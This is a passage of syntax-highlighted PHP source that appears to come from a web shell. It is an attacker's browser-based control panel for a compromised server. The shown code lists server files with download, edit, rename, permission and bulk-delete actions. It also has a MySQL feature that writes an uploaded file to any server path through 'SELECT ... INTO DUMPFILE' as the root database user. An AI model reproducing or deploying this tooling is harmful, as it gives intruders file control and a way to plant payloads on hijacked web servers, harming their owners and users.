<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px </span><span style="color: #8abeb7; text-decoration: underline;">solid #ddd;"&gt;&lt;td colspan="6" height="5"&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file_i</span> = <span style="color: #8abeb7;">'0'</span>;

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedata</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">key</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'filename'</span>]!=<span style="color: #8abeb7;">'..'</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'filename'</span>]!=<span style="color: #8abeb7;">'.'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileurl</span> = str_replace(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">"DOCUMENT_ROOT"</span>],<span style="color: #8abeb7;">''</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_</span><span style="color: #8abeb7; text-decoration: underline;">link'</span><span style="text-decoration: underline;">]);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #81a2be;">this</span>bg = bg();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #81a2be;">this</span>bg.<span style="color: #8abeb7;">'" onmouseover="this.className=\'focus\';" o</span><span style="color: #8abeb7; text-decoration: underline;">nmouseout="this.className=\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="text-decoration: underline;">bg.</span><span style="color: #8abeb7; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td width="2%" nowrap&gt;&lt;input name="dl[]" type="checkbox" value="'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'"&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.((strpos(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_link'</span>], <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">"DOCUMENT_ROOT"</span>])<span style="text-decoration: underline;"> !== </span><span style="color: #81a2be; text-decoration: underline;">false</span><span style="text-decoration: underline;">) ? </span><span style="color: #8abeb7; text-decoration: underline;">'&lt;a href="'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">fileurl</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">'" target="_blank"&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'filename'</span><span style="text-decoration: underline;">]).</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td nowrap&gt;&lt;a href="javascript:opfile(\'newtime\',\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'se</span><span style="color: #8abeb7; text-decoration: underline;">rver_link'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'mtime'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td nowrap&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'size'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td nowrap&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;a href="javascript:fileperm(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_link'</span>].<span style="color: #8abeb7;">'\');"&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'filechmod'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt; / '</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;a href="javascript:fileperm(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_link'</span>].<span style="color: #8abeb7;">'\');"&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'fileperm'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'fileowner'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td nowrap&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;a href="javascript:dofile(\'downfile\',\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;Down&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;a href="javascript:copyfile(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_link'</span>].<span style="color: #8abeb7;">'\');"&gt;Co</span><span style="color: #8abeb7; text-decoration: underline;">py&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;a href="javascript:opfile(\'editfile\',\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_link'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\',\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">filedb</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'dirlink'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'\');"&gt;Edit&lt;/a&gt; | '</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;a href="javascript:rename(\''</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filedb</span>[<span style="color: #8abeb7;">'server_link'</span>].<span style="color: #8abeb7;">'\');"&gt;Rena</span><span style="color: #8abeb7; text-decoration: underline;">me&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/td&gt;&lt;/tr&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file_i</span>++;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last mod</span><span style="color: #8abeb7; text-decoration: underline;">ified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="'</span>.bg().<span style="color: #8abeb7;">'"&gt;&lt;td align="center"&gt;&lt;input name="chkall" value="on" t</span><span style="color: #8abeb7; text-decoration: underline;">ype="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;&lt;td colspan="4"&gt;&lt;a href="javascript:dofile(\'delfiles\');"&gt;Delete selected&lt;/a&gt;&lt;/td&gt;&lt;td align="right"&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dir_i</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">' directories / '</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">file_i</span><span style="text-decoration: underline;">.</span><span style="color: #8abeb7; text-decoration: underline;">' files&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/form&gt;&lt;/table&gt;'</span>);
}<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">end dir</span>

<span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'sqlfile'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doing</span>==<span style="color: #8abeb7;">"mysqlupload"</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_FILES</span>[<span style="color: #8abeb7;">'uploadfile'</span>];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>[<span style="color: #8abeb7;">'tmp_name'</span>];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (file_exists(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">savepath</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'The goal file has already existed'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #8abeb7;">'Please choose a file'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>=<span style="color: #81a2be;">@fopen</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>,<span style="color: #8abeb7;">'r'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span>=<span style="color: #81a2be;">@fread</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>, filesize(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@fclose</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span> = bin2hex(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">upname</span>) <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">upname</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>[<span style="color: #8abeb7;">'name'</span>];
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mysqllink</span> = mydbconn(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpass</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674; text-decoration: underline;">dbport</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span> = q(<span style="color: #8abeb7;">"SELECT 0x</span><span style="color: #f0c674;">{$contents}</span><span style="color: #8abeb7;"> FROM mysql.user INTO DUMPFILE </span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="color: #f0c674; text-decoration: underline;">$savepath</span><span style="color: #8abeb7; text-decoration: underline;">';"</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   m(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span> ? <span style="color: #8abeb7;">'Upload success'</span> : <span style="color: #8abeb7;">'Upload has failed: '</span>.mysql_error<span style="text-decoration: underline;">());</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #b294bb;">?&gt;</span>
&lt;script type=<span style="color: #8abeb7;">"text/javascript"</span>&gt;
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">mysqlfile</span>(doing){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span>doing) <span style="color: #b5bd68;">return</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'doing'</span>).value=doing;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'mysqlfile'</span>).dbhost.value=$(<span style="color: #8abeb7;">'dbinfo'</span>).dbhost.value;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'mysqlfile'</span>).dbport.value=$(<span style="color: #8abeb7;">'dbinfo'</span>).dbport.value;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'mysqlfile'</span>).dbuser.value=$(<span style="color: #8abeb7;">'dbinfo'</span>).dbuser.value;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'mysqlfile'</span>).dbpass.value=$(<span style="color: #8abeb7;">'dbinfo'</span>).dbpass.value;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'mysqlfile'</span>).dbname.value=$(<span style="color: #8abeb7;">'dbinfo'</span>).dbname.value;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'mysqlfile'</span>).charset.value=$(<span style="color: #8abeb7;">'dbinfo'</span>).charset.value;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   $(<span style="color: #8abeb7;">'mysqlfile'</span>).submit();
}
&lt;/script&gt;
<span style="color: #b294bb;">&lt;?php</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span> = <span style="color: #8abeb7;">'localhost'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span> = <span style="color: #8abeb7;">'root'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbport</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbport</span> = <span style="color: #8abeb7;">'3306'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   formhead(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'MYSQL Information'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbinfo'</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makehide(<span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'sqlfile'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;p&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'DBHost:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbhost'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;20,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbhost</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">':'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbport'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;4,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbport</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'DBUser:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbuser'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;15,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbuser</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'DBPass:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbpass'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;15,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbpass</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'DBName:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeinput(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'dbname'</span>,<span style="color: #8abeb7;">'size'</span>=&gt;15,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dbname</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'DBCharset:'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   makeselect(<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'charset'</span>,<span style="color: #8abeb7;">'option'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charsetdb</span>,<span style="color: #8abeb7;">'selected'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">charset</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'nokey'</span><span style="text-decoration: underline;">=&gt;1));</span>
